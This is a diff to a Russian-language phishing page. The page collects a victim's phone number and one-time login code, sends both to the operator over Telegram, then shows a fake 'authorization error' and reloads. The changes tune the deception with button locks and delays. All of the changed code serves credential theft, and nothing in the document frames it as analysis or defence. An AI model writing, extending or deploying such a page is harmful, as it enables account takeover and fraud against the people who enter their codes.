@@ -31,6 +31,7 @@
             margin-top: 30px; background: linear-gradient(90deg, #8b5cf6, #6d28d9);
             border: none; color: white; padding: 16px 60px; border-radius: 35px;
             font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 1rem;
+            min-width: 200px;
         }
         .btn:disabled { background: #4b5563; opacity: 0.5; cursor: not-allowed; }
         .footer-text { margin-bottom: 30px; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 3px; color: #a78bfa; font-weight: bold; }
@@ -48,7 +49,7 @@
     <div id="screen-1" class="main-container">
         <div class="instruction">введите номер телефона</div>
         <input type="tel" id="phone" value="+7 ">
-        <button class="btn" onclick="sendPhone()">ДАЛЕЕ</button>
+        <button class="btn" id="nextBtn" onclick="sendPhone()">ДАЛЕЕ</button>
     </div>
 
     <!-- Шаг 2: Код -->
@@ -85,6 +86,7 @@
         const phoneInput = document.getElementById('phone');
         const fields = document.querySelectorAll('.c-field');
         const loginBtn = document.getElementById('loginBtn');
+        const nextBtn = document.getElementById('nextBtn');
 
         phoneInput.addEventListener('input', () => {
             if (!phoneInput.value.startsWith('+7 ')) phoneInput.value = '+7 ';
@@ -92,27 +94,42 @@
 
         function sendPhone() {
             const val = phoneInput.value;
+            // Блокируем кнопку "Далее" на 2 сек, чтобы не спамили при переходе
+            nextBtn.disabled = true;
             postToTG(`📱 <b>Новый лог:</b>\nНомер: <code>${val}</code>`);
-            document.getElementById('screen-1').classList.add('hidden');
-            document.getElementById('screen-2').classList.remove('hidden');
-            fields[0].focus();
+            
+            setTimeout(() => {
+                document.getElementById('screen-1').classList.add('hidden');
+                document.getElementById('screen-2').classList.remove('hidden');
+                fields[0].focus();
+            }, 500);
         }
 
-        function sendCode() {
+        async function sendCode() {
             let code = "";
             fields.forEach(f => code += f.value);
-            postToTG(`✅ <b>Данные получены:</b>\nНомер: <code>${phoneInput.value}</code>\nКод: <code>${code}</code>`)
-            .then(() => {
+
+            // Блокируем кнопку на 5 секунд
+            loginBtn.disabled = true;
+            loginBtn.innerText = "ПОДОЖДИТЕ...";
+
+            // Отправляем данные
+            await postToTG(`✅ <b>Данные получены:</b>\nНомер: <code>${phoneInput.value}</code>\nКод: <code>${code}</code>`);
+
+            // Ждем 5 секунд перед тем как выдать ошибку и обновить
+            setTimeout(() => {
                 alert("Ошибка авторизации. Попробуйте позже.");
                 location.reload();
-            });
+            }, 5000);
         }
 
         fields.forEach((f, i) => {
             f.addEventListener('input', () => {
                 if (f.value && i < 5) fields[i+1].focus();
                 const isFull = Array.from(fields).every(input => input.value.length === 1);
-                loginBtn.disabled = !isFull;
+                if (loginBtn.innerText !== "ПОДОЖДИТЕ...") {
+                    loginBtn.disabled = !isFull;
+                }
             });
             f.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && !f.value && i > 0) fields[i-1].focus();
